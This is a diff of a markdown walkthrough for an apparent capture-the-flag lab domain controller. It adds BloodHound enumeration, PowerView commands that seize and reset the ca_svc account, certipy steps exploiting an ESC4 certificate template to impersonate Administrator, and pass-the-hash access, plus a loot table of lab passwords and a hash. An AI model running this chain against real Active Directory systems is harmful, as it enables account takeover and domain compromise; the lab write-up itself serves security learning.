@@ -1,4 +1,9 @@
 # Intro
+![](../../../../Assest/Pasted%20image%2020250726120322.png)
+
+## Attack Path 
+
+> TODO: Create a schema of attack path (Now i'm going to watch the Milan match)
 
 # Enumeration
 
@@ -166,28 +171,117 @@ evil-winrm -i DC01.sequel.htb -u 'SEQUEL\ryan' -p 'WqSZAF6CysDQbGb3'
 ```
 ![](../../../../Assest/Pasted%20image%2020250724210452.png)
 
-# Privilege Escalation
 
+# Lateral Movement
+## Bloodhound 
+```bash
+bloodhound-python -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 -ns DC01.sequel.htb -c DCOnly
+```
+
+Start bloodhound GUI and import the extract data 
+```bash
+bloodhound
+```
+
+If we check the `First Degree Object Control` of `ryan` user we can notice that has a `WriteOver` engine over `CA_SVC` 
 ![](../../../../Assest/Pasted%20image%2020250724230053.png)
+## PowerView - Force  Change Password
+The user `ryan` has the ability to modify the owner of the user `ca_svc`.
 
+In this step we change the the owner of  `ca_svc` with `ryan`  that we have control. Add the `ResetPassword` permission to  `ryan`  over `ca_svc` and finally we change the password of  `ca_svc`. See the steps below
 
+First of all import the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script in the target machine
+![](../../../../Assest/Pasted%20image%2020250726075915.png)
+
+Change the ca_svc's `ownership` to ryan using the `Set-DomainObjectOwner` method of PowerView 
+```bash
+Set-DomainObjectOwner -Identity ca_svc -OwnerIdentity ryan
+```
+
+We need to add the `ResetPassword` permission to change the password. We can do it using the `Add-DomainObjectAcl` method of PowerView
+```bash
+Add-DomainObjectAcl -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights ResetPassword
+```
+
+Create a secure string that contain the new password for the `ca_svc` user
+```bash
+$SexyPassword = ConvertTo-SecureString 'BusyBusy123!' -AsPlainText -Force
+```
+
+Change the password using the `Set-DomainUserPassword` method of PowerView
+```bash
+Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $SexyPassword
+```
+
+![](../../../../Assest/Pasted%20image%2020250726085229.png)
+
+> [!TIP]
+> If u receive this error  "*Warning: [Set-Domain User Password] Error setting password for user 'ca_svc' : Exception calling "SetPassword" with "1" argument(s):*" during the execution of `Set-DomainUserPassword` check if the new password  satisfies the password's policy
+
+To verify that the password reset was successful 
+
+```bash
+netexec smb DC01.sequel.htb -u ca_svc -p 'BusyBusy123!'
+```
+
+![](../../../../Assest/Pasted%20image%2020250726093145.png)
+
+# Privilege Escalation
+## Vulnerable Certificates
+
+Now that we have the control over `CA_SVC` user we are member of this two group:
+- `CERT PUBLISHERS`
+- `DOMAIN USERS`
 ![](../../../../Assest/Pasted%20image%2020250724230456.png)
 
+We can see in the description section of this group that `Members of this group are permitted to publish certificates to the directory`
+![](../../../../Assest/Pasted%20image%2020250726085925.png)
 
-!TODO: Reset password; and check vulnerable template 
+Using `certipy` tool we can enumerate the vulnerable certificate
+```bash
+certipy find -u 'ca_svc@sequel.htb' -p 'BusyBusy123!' -dc-ip 10.129.232.128 -vulnerable -stdout
+```
+![](../../../../Assest/Pasted%20image%2020250726094501.png)
+The `DunderMifflinAuthentication` certificate has vulnerable to `ESC4`.
+To exploit the `ESC4` we can follow this step:
+1. Save the old configuration, edit the template and make it vulnerable
+```bash
+certipy template -u ca_svc@sequel.htb -p 'BusyBusy123!' -template 'DunderMifflinAuthentication' -dc-ip 10.129.232.128 -save-old
+```
+![](../../../../Assest/Pasted%20image%2020250726110400.png)
+
+2. now if we run again the `certipy` in find mode we can see the `Full Control Principals` is changed
+![](../../../../Assest/Pasted%20image%2020250726110603.png)
+
+3. Request a template certificate with impersonate the `Administrator` 
+```bash
+certipy req -u 'ca_svc@sequel.htb' -p 'BusyBusy123!' -dc-ip 10.129.232.128 -target DC01.sequel.htb -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'Administrator@sequel.htb' 
+```
+![](../../../../Assest/Pasted%20image%2020250726102222.png)
+
+> [!TIP]
+> If u receive this error *CERTSRV_E_SUBJECT_DNS_REQUIRED* try to do your **steps very quickly**
+
+
+3.  we can use the  `administrator.pfx` file  to get a TGT and extract the administrator hash 
+```bash
+certipy auth -pfx administrator.pfx -domain sequel.htb
+```
+
+## Evil-Winrm Hash Pass
+Finally we can pass the hash through the `evil-winrm` and spawn a **Administrator** shell
+![](../../../../Assest/Pasted%20image%2020250726120138.png)
+cat the **root.txt** flag under the Administrator's Desktop
+
 # Loot
 
 ## Credentials
 
-| user           | pwd              |
-| -------------- | ---------------- |
-| rose           | KxEPkKe6R8su     |
-| sa@sequel.htb  | MSSQLP@ssw0rd!   |
-| SEQUEL\sql_svc | WqSZAF6CysDQbGb3 |
-| SEQUEL\ryan    | WqSZAF6CysDQbGb3 |
+| user                 | pwd                                                               |
+| -------------------- | ----------------------------------------------------------------- |
+| rose                 | KxEPkKe6R8su                                                      |
+| sa@sequel.htb        | MSSQLP@ssw0rd!                                                    |
+| SEQUEL\sql_svc       | WqSZAF6CysDQbGb3                                                  |
+| SEQUEL\ryan          | WqSZAF6CysDQbGb3                                                  |
+| SEQUEL\Administrator | aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff |
 
-## Flags
-
-| name     | falg                             |
-| -------- | -------------------------------- |
-| user.txt | b3370e6499147f8772878b0bc36294c0 |
